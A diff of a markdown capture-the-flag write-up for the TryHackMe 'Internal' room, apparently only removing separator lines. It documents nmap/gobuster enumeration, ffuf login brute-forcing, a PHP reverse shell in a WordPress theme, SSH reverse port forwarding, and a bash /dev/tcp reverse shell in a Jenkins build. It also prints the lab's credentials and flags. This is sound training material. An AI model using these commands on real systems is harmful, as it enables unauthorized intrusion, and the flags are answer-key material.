@@ -2,17 +2,14 @@
 
 
 # Overview 
----
 - **Difficulty**: Hard 
 - **Platform**: Linux
 - **Link**: https://tryhackme.com/room/internal
 
 ## Resolution Summary 
----
 **We discovered available services with an `Nmap` scan, revealing SSH and HTTP. We enumerated hidden directories with `Gobuster`, uncovering a `WordPress` instance and a `phpMyAdmin` portal. We brute-forced the WordPress login with `ffuf`, gaining admin access and finding credentials in a private post. We then injected a PHP reverse shell into a theme file to gain initial foothold. From there, we retrieved database credentials from `wp-config.php` and discovered internally running services with `ss -tuln`. We exposed a local `Jenkins` instance via SSH reverse port forwarding, brute-forced its login with `ffuf`, and gained RCE by injecting a reverse shell into a build project. Finally, we found plaintext root credentials in a text file within the Jenkins Docker container, switched back to our shell as `aubreanna`, and escalated to root.**
 
 # Information Gathering 
----
 - **Since we were given an IP address, we started by performing an `Nmap` scan on the target. We added the `-sV` flag in order to find the software's versions:** 
 ```bash
 sudo nmap -sV 10.82.166.88
@@ -28,7 +25,6 @@ sudo nmap -sV 10.82.166.88
 - **To begin with, we focused on the web application on port 80.**
 
 ## HTTP (80)
---- 
 - **We were greeted by the default Apache2 home page.** 
 - **Therefore, we began fuzzing for hidden directories using `Gobuster`:**
 ```bash
@@ -44,7 +40,6 @@ gobuster dir -u http://10.82.166.88/ -w /usr/share/wordlists/seclists/Discovery/
 ```
 
 ### Idea 1: Focusing on `phpmyadmin` version 4.6.6 
----
 - **Upon accessing the web page on `/phpmyadmin`, we found a login form.** 
 - **We began by manually trying some common usernames, hoping to be able to spot differences in reflected error messages.** 
 
@@ -78,7 +73,6 @@ ffuf -u http://10.82.166.88/phpmyadmin/index.php -X POST -d "pma_username=FUZZ&p
 ffuf -u http://10.82.157.202/phpmyadmin/index.php -X POST -d "pma_username=root&pma_password=FUZZ&server=1&target=index.php&token=a27a7ba4b340001e6ec49ac27af597b2" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: pmaCookieVer=5; phpMyAdmin=vivnl684p56l518n7eqk9k7bom; pma_lang=en; pma_collation_connection=utf8mb4_unicode_ci" -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt -fc 200
 ```
 ### Idea 2: Focusing on `wordpress` version 5.4.2
----
 - **The presence of such directory hinted us that the website is running WordPress.** 
 - **To begin with, we access the login portal at `http://internal.thm/blog/wp-login.php`.** 
 
@@ -99,7 +93,6 @@ ffuf -u http://internal.thm/blog/wp-login.php -X POST -d "log=admin&pwd=FUZZ&wp-
 	 - **`admin:my2boys`**
 
 # Exploitation 
----
 - **After navigating the admin panel, we took a look at the available posts, which proved useful as there was a private post containing credentials:** 
 	- **`william:arnold147`**
 
@@ -147,7 +140,6 @@ ssh -R 9000:127.0.0.1:8080 [attacker user]@[attacker IP]
 
 - **Finally, we could access the web page from our machine using the following URL: `http://localhost:9000`**
 ## HTTP (8080)
----
 - **We were greeted by a Jenkins login page.** 
 - **We immediately tried our previously found credentials (which we did not use yet) : `william:arnold147`, but they were no use.** 
 
@@ -176,9 +168,7 @@ bash -c 'bash -i >& /dev/tcp/[attacker IP]/4444 0>&1'
 ```
 
 # Privilege Escalation 
----
 ## First Step
----
 - **Once we gained RCE, we looked for interesting files by using:**
 ```bash 
 find / -type f -name "*.txt" 2>/dev/null
@@ -199,7 +189,6 @@ aubreanna:bubb13guM!@#123
 
 - **Given that, we were able to access the first flag `THM{int3rna1_fl4g_1}` and another text file mentioning a Jenkins instance running locally on port `8080`.**
 ## Second Step
----
 - **Once we got a shell from the Jenkins instance, we looked for any valuable text file which could provide any additional information:**
 ```bash
 find / -type f -name '*.txt' 2>/dev/null
@@ -211,13 +200,11 @@ find / -type f -name '*.txt' 2>/dev/null
 - **However, since we were in a Docker container, we were not able to use our credentials yet.** 
 - **We got back to our webshell, were we last authenticated as `aubreanna`, we changed users to root and accessed the last flag.** 
 # Trophy 
----
 **User.txt → `THM{int3rna1_fl4g_1}`** 
 
 **Root.txt → `THM{d0ck3r_d3str0y3r}`**
 
 # Lessons Learned
----
 - **Try Multiple Wordlists.**
 - **Pay more attention to files/info you discover/enumerate.**
 - **Always try admin and root as users (alongside the others you might find).**
